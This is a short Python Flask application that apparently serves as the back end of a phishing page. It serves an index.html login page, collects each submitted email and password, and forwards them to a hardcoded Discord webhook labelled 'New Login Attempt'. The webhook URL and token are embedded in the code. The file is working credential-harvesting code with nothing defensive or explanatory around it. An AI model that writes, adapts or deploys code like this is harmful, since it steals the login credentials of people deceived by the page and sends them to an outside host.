from flask import Flask, request, send_from_directory
import requests
import os

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1397929399109681235/dm0MA47QY5CEasdN9WB65XiXi2Kl_EdcK7L4Jv6XaiEwyBENtIYxB57I_X2beEismVKm"

# Serve HTML file
@app.route('/')
def serve_html():
    return send_from_directory(os.path.dirname(__file__), 'index.html')

# Handle form submission
@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    
    # Prepare Discord message
    discord_data = {
        "embeds": [{
            "title": "New Login Attempt",
            "color": 16711680,  # Red
            "fields": [
                {"name": "Email", "value": data.get('email', 'None'), "inline": True},
                {"name": "Password", "value": data.get('password', 'None'), "inline": True}
            ]
        }]
    }
    
    # Send to Discord
    requests.post(WEBHOOK_URL, json=discord_data)
    
    return {'status': 'success'}

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)
